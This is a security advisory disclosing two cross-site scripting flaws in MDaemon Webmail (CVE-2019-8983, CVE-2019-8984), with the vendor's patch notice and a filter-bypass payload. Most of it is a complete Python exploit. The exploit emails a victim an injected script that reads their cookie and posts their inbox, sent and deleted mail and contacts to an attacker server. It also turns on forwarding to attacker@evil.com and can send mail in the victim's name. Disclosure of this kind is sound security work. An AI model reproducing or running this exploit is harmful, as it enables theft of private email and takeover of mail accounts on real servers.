**Vulnerabilities Summary**  
The following advisory describes two XSS vulnerabilities found in MDaemon Mail Server which lets attackers send emails with malicious payloads and run client side code on victim's browsers just by opening an email.

**CVE**  
CVE-2019-8983  
CVE-2019-8984

**Credit**  
An independent security researcher, Zhong Zhaochen, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**  
MDaemon mail Server versions 14.0.x - 18.5.x

**Vendor Response**

> Two cross-site scripting (XSS) vulnerabilities in MDaemon Webmail (WorldClient) were recently reported by [SecuritiTeam Secure Disclosure (SSD)](https://ssd-disclosure.com/). These vulnerabilities may impact all browser types.
>
> To address this issue, the development team at MDaemon Technologies has released patches for affected versions of MDaemon.
>
> For specific information, see the **[Affected Software Section](https://www.altn.com/Support/SecurityUpdate/MD021519_MDaemon_EN/#Selection)** below.
>
> **Recommendation:**
>
> For MDaemon installations, MDaemon Technologies recommends that administrators download and install the appropriate update listed below.
>
> **Known Issues:**
>
> There are no known issues that customers may experience when installing this patch.

**Vulnerability Details**

The first vulnerability lies in the html attachment feature of MDaemon. Attackers can send malicious html documents, and when the victim will open the attachment, it'll be opened in the browser and will run the attacker's client side code.

![](https://ssd-disclosure.com/wp-content/uploads/2019/02/Mdaemon-email-attachment-300x142.png)

When the victim clicks the html file with this content:

<script>alert(window.location)</script>

It will open the attachment immediately and will run the attackers client side code.

![](https://ssd-disclosure.com/wp-content/uploads/2019/02/Mdaemon-attachment-click-300x288.png)

The second XSS vulnerability is inside the content itself of the email. Attackers can exploit this vulnerability in order to steal any folder/contact of the victim's email and forward them to himself. 

The Mdeamon server serves the XSS content with an error method.

The XSS filter don't deal well with the "<!----" as the attribute of the html element which can bypass the XSS filter. We can bypass the filter in this way:

<svg <!----test----="" onload="alert(123)">

Once the victim opens the mail with the malicious payload, the code that the attacker injected will run immediately. 

**Exploit:**

This is exploit which will send from attackers email a malicious email to the victim with a payload that will send back the attacker the victim's mails.
```python
#coding=utf-8

from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import smtplib

#---------------------------setting--------------------------------#
# the attacker's email info #Test with MDaemon email
mail\_host="test.com"            
mail\_user="attacker@test.com"     
mail\_pass="Password123"             

# set the victorm
victim = "victim@test.com"      #MDaemon Email    maildomin.com:3000

# set the keywords
keywords\_receive = "\[\]"  
keywords\_send = "\[\]"  
keywords\_delete = "\[\]"  
keywords = "\[\]"

# set the max count
max\_count\_recevie = 300
max\_count\_send = 300
max\_count\_delete = 300

# set the browser, chrome has some errors when use svg.
# in fact,this is no needed. We can put two payloads together in the email.
browser = 'others'  #\['chrome','others'\]


# set the receiver's server.
xss\_platform = 'http://192.168.142.132/receiveinfo/message\_receive.php'

# email forward
ForwardingAddress = 'attacker@evil.com'

#MITM attack
send\_attack\_to\_who = 'last@test.com'
Subject = 'title Hello!'
body = 'This is body!!!'

# open different functions
function = \['forwarding','contact','receive','send','delete'\]
#function = \['test'\]


sent\_content = "THe email content!!!!"

def \_format\_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))

def send\_mail():

    from\_addr = mail\_user
    password = mail\_pass
    smtp\_server = mail\_host
    to\_addr = victim

    msg = MIMEMultipart()
    key\_words = {}
    content = sent\_content + gen\_js()

    msg\['From'\] = \_format\_addr('%s' % from\_addr)   
    msg\['To'\] = \_format\_addr('%s' % to\_addr)      
    msg\['Subject'\] = Header('Read the email!', 'utf-8').encode()  

    msg.attach(MIMEText(content, 'html', 'utf-8'))
    server = smtplib.SMTP(mail\_host, 25)   
    #server.set\_debuglevel(1)
    server.login(from\_addr, password)
    server.sendmail(from\_addr, to\_addr, msg.as\_string())
    server.quit()


contact = '''
                try{
                newURL = currentURL.replace(/BlankMessageBody/,'Contacts');
                xmlhttp1=new XMLHttpRequest();
                url = newURL
                xmlhttp1.open('GET',url,false);
                xmlhttp1.send(null);
                response = xmlhttp1.responseText;
                var to\_send1 = 'a=' + window.btoa(encodeURIComponent(response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss\_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to\_send1);}catch(error){}
            '''

receive = '''
                try{    
                if('&View=Main')           
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all\_email = new Array();
                var max\_count = ''' + str(max\_count\_recevie) + ''';
                var key\_words =''' + keywords\_receive + ''';
                var max\_page = 1;
                var page=1;
                for(page;page<max\_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=0%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max\_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all\_email.push(data1.scripts\[a\].id); } }
                if(max\_count>=all\_email.length || max\_count==0 ){
                max\_count=all\_email.length;}
                for(var i=0;i<max\_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=0%26Number=') + all\_email\[i\];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email\_response = xmlhttp3.responseText;
                var flag = 0;
                if(key\_words.length==0){flag=1;}
                for(var k in key\_words){
                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
                if(flag==0){continue;}
                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss\_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to\_send); }}catch(error){}
            '''

send = '''
                try{                                
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all\_email = new Array();
                var max\_count = ''' + str(max\_count\_send) + ''';
                var key\_words =''' + keywords\_send + ''';
                var max\_page = 1;
                var page=1;
                for(page;page<max\_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=9%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max\_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all\_email.push(data1.scripts\[a\].id); } }
                if(max\_count>=all\_email.length || max\_count==0 ){
                max\_count=all\_email.length;}
                for(var i=0;i<max\_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=9%26Number=') + all\_email\[i\];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email\_response = xmlhttp3.responseText;
                var flag = 0;
                if(key\_words.length==0){flag=1;}
                for(var k in key\_words){
                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
                if(flag==0){continue;}
                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss\_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to\_send); }}catch(error){}
            '''

delete = '''
                try{                 
                newURL1 = currentURL.replace(/BlankMessageBody/,'List');
                EURL = currentURL.replace(/BlankMessageBody/,'Message');
                var all\_email = new Array();
                var max\_count = ''' + str(max\_count\_delete) + ''';
                var key\_words =''' + keywords\_delete + ''';
                var max\_page = 1;
                var page=1;
                for(page;page<max\_page+1;page++){
                xmlhttp2=new XMLHttpRequest();
                url1 = newURL1 + decodeURIComponent('%26ReturnJavaScript=1%26FolderID=10%26Page=') + page
                xmlhttp2.open('GET',url1,false);
                xmlhttp2.send(null);
                response1 = xmlhttp2.responseText;
                data1 =JSON.parse(response1);
                max\_page = data1.changeMultiPage.totalPages;
                for(var a in data1.scripts){
                all\_email.push(data1.scripts\[a\].id); } }
                if(max\_count>=all\_email.length || max\_count==0 ){
                max\_count=all\_email.length;}
                for(var i=0;i<max\_count;i++ ){
                xmlhttp3=new XMLHttpRequest();
                eurl = EURL + decodeURIComponent('%26ReturnJavaScript=1%26ContentType=JavaScript%26FolderID=10%26Number=') + all\_email\[i\];
                xmlhttp3.open('GET',eurl,false);
                xmlhttp3.send(null);
                email\_response = xmlhttp3.responseText;
                var flag = 0;
                if(key\_words.length==0){flag=1;}
                for(var k in key\_words){
                if(email\_response.match(key\_words\[k\])!=null){flag=1;}}
                if(flag==0){continue;}
                var to\_send = 'a=' + window.btoa(encodeURIComponent(email\_response)) + decodeURIComponent('%26b=') + window.btoa(encodeURIComponent(user));
                xmlhttp4=new XMLHttpRequest();
                server = ' ''' + xss\_platform + ''' '
                xmlhttp4.open('POST',server,false);
                xmlhttp4.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp4.send(to\_send); } }catch(error){}
            '''

forwarding = '''
                try{                
                newURL2 = currentURL.replace(/BlankMessageBody/,'Options-Prefs');
                eurl = newURL2 + decodeURIComponent('%26Save=Yes%26ReturnJavaScript=Yes');
                var to\_send = decodeURIComponent('ForwardingEnabled=Yes%26ForwardingAddress='''+ ForwardingAddress +'''%26ForwardingRetainCopy=Yes');                
                xmlhttp3=new XMLHttpRequest();
                xmlhttp3.open('POST',eurl,false);
                xmlhttp3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xmlhttp3.send(to\_send);}catch(error){}

'''

mitm = '''
                try{
                newURL = currentURL.replace(/BlankMessageBody/,'Compose');
                xmlhttp1=new XMLHttpRequest();
                url = newURL + decodeURIComponent('%26ComposeInNewWindow=Yes%26ChangeView=No%26SendNow=Yes');
                xmlhttp1.open('POST',url,false);
                xmlhttp1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                letter = decodeURIComponent('Attachment=%26ComposeUser=AGdsXhNOEJOGhG7lRyMJ%26ComposeID=1%26Attn=%26Company=%26From=0%26Reply-To=%26SaveSentMessage=No%26To=''' +send\_attack\_to\_who+'''%26CC=%26BCC=%26Subject=t''' + Subject + '''%26Body=test2%26BodyHTML='''+ body +'''\\');
                xmlhttp1.send(letter);
                response = xmlhttp1.responseText;}catch(error){}
'''
test = '''
                try{
                alert('You are hacked!!!!') }catch(error){}
            '''
user = '''      
                try{
                var user = 'unknow';
                var pos=document.cookie.toLowerCase().indexOf('user=') + 5;
                subcookie = document.cookie.substring(pos);
                var pos1 = subcookie.indexOf(';');
                if(pos1!=-1){ user = subcookie.substring(0,pos1);
                }else{user = subcookie }}catch(error){}
                currentURL = window.location.href;
                if(currentURL.indexOf('View=Main') > 0){
                currentURL = currentURL.replace(/Main/,'BlankMessageBody');}
'''
#function = \['forwarding','contact','receive','send','delete','mitm'\]
def gen\_js():
    if browser == 'chrome':     
        attact\_js = '''<img/<!----test----/onerror="''' + user
        if 'forwarding' in function:
            attact\_js += forwarding     
        if 'mitm' in function:
            attact\_js += mitm  
        if 'contact' in function:
            attact\_js += contact  
        if 'receive' in function:
            attact\_js += receive  
        if 'send' in function:
            attact\_js += send  
        if 'delete' in function:
            attact\_js += delete  
        if 'test' in function:
            attact\_js += test  
        attact\_js += '''" src="#">'''  
    else:
        attact\_js = '''<svg/<!----test----/onload="''' + user
        if 'forwarding' in function:
            attact\_js += forwarding     
        if 'mitm' in function:
            attact\_js += mitm   
        if 'contact' in function:
            attact\_js += contact  
        if 'receive' in function:
            attact\_js += receive  
        if 'send' in function:
            attact\_js += send  
        if 'delete' in function:
            attact\_js += delete  
        if 'test' in function:
            attact\_js += test                    
        attact\_js += '''">'''  
    return attact\_js

send\_mail()
```
